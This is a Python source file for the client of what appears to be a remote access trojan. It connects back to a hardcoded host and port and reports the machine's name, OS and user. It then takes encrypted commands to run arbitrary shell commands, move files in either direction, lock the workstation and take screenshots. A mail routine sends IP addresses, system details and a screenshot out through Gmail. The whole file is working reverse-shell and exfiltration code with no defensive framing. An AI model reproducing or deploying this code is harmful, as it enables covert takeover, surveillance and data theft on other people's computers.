import subprocess
import os
import shutil
import sys
import requests
import time
import socket
import json
import pyscreeze
import platform
import ctypes
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import smtplib
from io import StringIO, BytesIO
from cryptography.fernet import Fernet


HOST = "192.168.1.37"
PORT = 6666
BUFF = 1024


def connect():
    global objSocket, objEncryptor
    while True:
        try:
            objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            objSocket.connect((HOST, PORT))
        except socket.error:
            time.sleep(5)
        else:
            break


def send_client_info():
    global objEncryptor, objSocket
    arrClientInfo = [socket.gethostname()]
    strPlatform = f"{platform.system()} {platform.release()}"
    arrClientInfo.extend([strPlatform, os.environ["USERNAME"]])

    objSocket.send(json.dumps(arrClientInfo).encode())
    objEncryptor = Fernet(objSocket.recv(BUFF))


recv = lambda buffer: objEncryptor.decrypt(objSocket.recv(buffer))
send = lambda data: objSocket.send(objEncryptor.encrypt(data))

def recvall(buffer):
    bytData = b""
    while len(bytData) < buffer:
        bytData += objSocket.recv(buffer)
    return objEncryptor.decrypt(bytData)
def sendall(data):
    bytEncryptedData = objEncryptor.encrypt(data)
    intDataSize = len(bytEncryptedData)
    send(str(intDataSize).encode())
    time.sleep(0.2)
    objSocket.send(bytEncryptedData)

def receive(data):
    if not os.path.isfile(data):
        send(b"[-] Target file not found!")
        return

    with open(data, "rb") as objFile:
        sendall(objFile.read())

def download(data):
    intBuffer = int(data)
    file_data = recvall(intBuffer)
    strOutputFile = recv(BUFF).decode()
    print(strOutputFile)
    try:
        with open(strOutputFile, "wb") as objFile:
            objFile.write(file_data)
        response = "[+] Done!".encode()
    except Exception as e:
        print(e)
        response = "[-] Path is protected/invalid!".encode()
    return response

def upload(data):
    response = b""
    if not os.path.isfile(data):
        response = b"[-] Target file not found!"
    else:
        with open(data, "rb") as objFile:
            response = (objFile.read())  # Send Contents of File
    return response

def lock():
    ctypes.windll.user32.LockWorkStation()
    response = b"[+] Locked!"
    return response

def screenshot():
    img = pyscreeze.screenshot()
    with BytesIO() as objBytes:
        # Save Screenshot into BytesIO Object
        img.save(objBytes, format="PNG")
        # Get BytesIO Object Data as bytes
        ss = objBytes.getvalue()

    return ss

def send_info_as_mail(email):
    if email == "":
        return b"[-] Invalid email address!"
    try:
        host = "smtp.gmail.com"
        port = 465
        val = smtplib.SMTP_SSL(host, port)
        val.login("your@gmail.com", "Passw0rd!")

        msg = MIMEMultipart()
        msg['Subject'] = "Client Info"
        msg['From'] = "your@gmail.com"
        msg['To'] = email

        response = requests.get("https://api.ipify.org?format=json")
        public_ip = response.json()["ip"]
        processor = platform.processor()
        system_info = platform.system() + " " + platform.version()
        host_name = socket.gethostname()
        private_ip = socket.gethostbyname(host_name)
        txt = MIMEText("""
                                PUBLIC IP: {0}
                                PROCESSOR: {1}
                                SYSTEM:    {2}
                                HOST NAME: {3}
                                PRIVATE IP:{4}
                               """.format(public_ip, processor, system_info, host_name, private_ip))
        msg.attach(txt)


        _file = MIMEApplication(screenshot(),  _subtype="png")
        _file.add_header('Content-Disposition', 'attachment', filename="info.png")
        msg.attach(_file)

        val.send_message(msg)
        val.quit()
        return b"[+] Success!"

    except Exception as e:
        return f"[-] Error! {e}".encode()

def run():
    while True:
        strCurrentDir = os.getcwd()
        order = recv(BUFF).decode()
        print(order)
        bytResponse = b""
        if order == "goback":
            os.chdir(strCurrentDir)
            bytResponse = f"\n{os.getcwd()}>".encode()
        elif order == "exit" or order == "quit":
            send("[+] Process is being terminated...")
            time.sleep(3)
            objSocket.close()
        elif order[:2] == "cd":
            if os.path.exists(order[3:]):
                os.chdir(order[3:])
                bytResponse= f"[+] Changing working directory to {os.getcwd()}>".encode()
            else:
                bytResponse = "[-] Path not found!".encode()

        elif order[:4] == "send":
            bytResponse = download(order[4:])

        elif order[:4] == "recv":
            bytResponse = upload(order[4:])

        elif order[:4] == "lock":
            bytResponse = lock()

        elif order == "screenshot":
            bytResponse = screenshot()
        elif order[:4] == "mail":
            bytResponse = send_info_as_mail(order[5:])

        elif len(order) > 0:
            objCommand = subprocess.Popen(order, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE, shell=True)
            strOutput = objCommand.stdout.read() + objCommand.stderr.read()
            bytResponse = strOutput

        else:
            bytResponse = b"Error!"

        sendall(bytResponse)





connect()
send_client_info()
run()